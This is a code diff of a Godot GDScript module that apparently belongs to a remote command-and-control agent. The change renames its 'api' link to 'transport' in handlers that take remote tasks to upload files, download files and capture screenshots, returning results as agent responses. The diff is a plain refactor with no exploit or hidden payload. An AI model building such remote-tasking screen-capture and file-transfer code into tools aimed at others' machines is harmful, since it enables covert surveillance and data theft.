@@ -2,18 +2,18 @@ extends Node
 
 @export var file_tasks = {}
 
-var api
+var transport
 var time = 0
 var time_period = 1
 
 var FileTransfer = preload("res://file_transfer.gd")
 
 func _ready():
-	api = $".".get_parent().get_node("api")
+	transport = $".".get_parent().get_parent().get_node("transport")
 	file_tasks = {}
 
 
-func _on_tasking_upload(task):
+func _on_tasking_upload(transport, task):
 
 	if task.has("command") and task.get("command") == "upload" and task.has("parameters"):
 		var task_id = task.get("id")
@@ -24,7 +24,7 @@ func _on_tasking_upload(task):
 		print("parameters: ", parameters)
 
 		print("download the following")
-		file_tasks[task_id] = FileTransfer.new(task_id, parameters.get("remote_path"), FileTransfer.DIRECTION.UPLOAD, api, parameters.get("file"))
+		file_tasks[task_id] = FileTransfer.new(task_id, parameters.get("remote_path"), FileTransfer.DIRECTION.UPLOAD, transport, parameters.get("file"))
 		print(parameters.get("remote_path"))
 		print("")
 	else:
@@ -32,7 +32,7 @@ func _on_tasking_upload(task):
 		# TODO: agent_response in failure cases
 
 
-func _on_tasking_download(task):
+func _on_tasking_download(transport, task):
 	
 	print("\n\n______________________________________________________")
 	print("_on_tasking_download(", task, ")")
@@ -44,13 +44,13 @@ func _on_tasking_download(task):
 		test_json_conv.parse(task.get("parameters"))
 		var parameters = test_json_conv.get_data()
 
-		file_tasks[task_id] = FileTransfer.new(task_id, parameters.get("file_path"), FileTransfer.DIRECTION.DOWNLOAD, api)
+		file_tasks[task_id] = FileTransfer.new(task_id, parameters.get("file_path"), FileTransfer.DIRECTION.DOWNLOAD, transport)
 	else:
 		print("bad upload task: ", task)
 		# TODO: agent_response in failure cases
 
 
-func _on_tasking_screenshot(task):
+func _on_tasking_screenshot(transport, task):
 	print("\n\n______________________________________________________")
 	print("_on_tasking_screenshot(",task,")")
 	print("______________________________________________________\n\n")
@@ -64,8 +64,8 @@ func _on_tasking_screenshot(task):
 		var screenshot = DisplayServer.screen_get_image(parameters.get("index"))
 		
 		if screenshot == null:
-			api.send_agent_response(
-				api.create_task_response(
+			transport.send(
+				transport.create_task_response(
 					false,
 					true,
 					task.get("id"),
@@ -77,7 +77,7 @@ func _on_tasking_screenshot(task):
 			var file_path = "/screenshot/monitor_%s.png" % [parameters.get("index")]
 
 			# TODO: for from_screen in range(DisplayServer.get_screen_count()): ?
-			file_tasks[task_id] = FileTransfer.new(task_id, file_path, FileTransfer.DIRECTION.SCREENSHOT, api, "", raw_data, true)
+			file_tasks[task_id] = FileTransfer.new(task_id, file_path, FileTransfer.DIRECTION.SCREENSHOT, transport, "", raw_data, true)
 	else:
 		print("bad screenshot task: ", task)
 		# TODO: agent_response in failure cases
